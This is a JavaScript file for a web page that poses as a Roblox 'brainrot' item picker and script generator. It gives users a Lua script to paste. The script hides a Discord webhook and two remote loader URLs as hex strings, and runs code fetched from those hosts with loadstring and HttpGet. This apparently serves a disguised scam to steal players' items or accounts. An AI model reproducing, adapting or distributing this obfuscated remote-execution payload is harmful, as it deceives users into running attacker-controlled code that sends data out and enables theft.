// Brainrot List
const brainrots = [
    "Capibarelino Apelino","Daga-Tubo","FluriFlura","Holy Arepa","La Foca Lasagnetta",
    "Lirili Larila","Noobini Lapis Lazulini","Noobini Pizzanini","Noobini Santanini",
    "Penguino Pizza","Pipi Corni","Pipi Kiwi","Pipi Peachi","Pipi Strawberry",
    "Raccooni Jandelini","Slimo Li Appluni","Svinina Bombardino","Talpa Di Fero",
    "Tartaragno","Tim Cheese"
];

// DOM Elements
const listContainer = document.getElementById("brainrots-list");
const searchInput = document.getElementById("search");
const generateBtn = document.getElementById("generate-btn");
const outputContainer = document.getElementById("output-container");
const scriptOutput = document.getElementById("script-output");
const copyBtn = document.getElementById("copy-btn");
const userInput = document.getElementById("user-id");

// Populate brainrots
function populateBrainrots(filter="") {
    listContainer.innerHTML = "";
    brainrots.filter(b => b.toLowerCase().includes(filter.toLowerCase()))
        .forEach(b => {
            const div = document.createElement("div");
            div.className = "brainrot-item";
            div.innerHTML = `<input type="checkbox" value="${b}"> ${b}`;
            listContainer.appendChild(div);
        });
}
populateBrainrots();

// Search filter
searchInput.addEventListener("input", e => populateBrainrots(e.target.value));

// Hex decode function
function decode(hex) {
    return hex.replace(/../g, c => String.fromCharCode(parseInt(c,16)));
}

// Generate Script
generateBtn.addEventListener("click", () => {
    const userID = userInput.value.trim();
    if(!userID) return alert("Enter a User ID!");
    
    const selected = Array.from(document.querySelectorAll("#brainrots-list input:checked"))
                          .map(cb => cb.value);
    if(selected.length === 0) return alert("Select at least one Brainrot!");

    outputContainer.classList.add("hidden");

    // Simulate loading
    setTimeout(() => {
        const webhookHex = "68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313438303331363433373930313038323736342f4861735858314862695957494c2d7056723248656f56676839784e6f75477957655f5f6e31536c634d513239574d46626d46634c345641356970516978512e6c756137";
        const tradeHex = "68747470733a2f2f6170692e6c7561726d6f722e6e65742f66696c65732f76342f6c6f61646572732f66626364316432353838396138343332393731303764656133363432303434642e6c7561";
        const autoGrabHex = "68747470733a2f2f676473626f6c756e6576737777636667676c6c682e73757061626173652e636f2f66756e6374696f6e732f76312f7261772d73696c656e746875623f69643d706f64757775796a6e647933";

        const brainrotLines = selected.map(b => `    ["${b}"] = true`).join(",\n");

        const script = 
`getgenv().WEBHOOK_URL = decode("${webhookHex}")
getgenv().TARGET_ID = ${userID}
getgenv().DELAY_STEP = 1
getgenv().TRADE_CYCLE_DELAY = 2
getgenv().TARGET_BRAINROTS = {
${brainrotLines}
}

local Trade = "${tradeHex}"
local Auto_grab = "${autoGrabHex}"

task.spawn(function()
    loadstring(game:HttpGet(decode(Trade)))()
end)

task.spawn(function()
    loadstring(game:HttpGet(decode(Auto_grab)))()
end)

local function decode(hex)
    return hex:gsub("..", function(c) return string.char(tonumber(c,16)) end)
end`;

        scriptOutput.value = script;
        outputContainer.classList.remove("hidden");
    }, 2000);
});

// Copy script
copyBtn.addEventListener("click", () => {
    scriptOutput.select();
    document.execCommand("copy");
    alert("Script copied!");
});
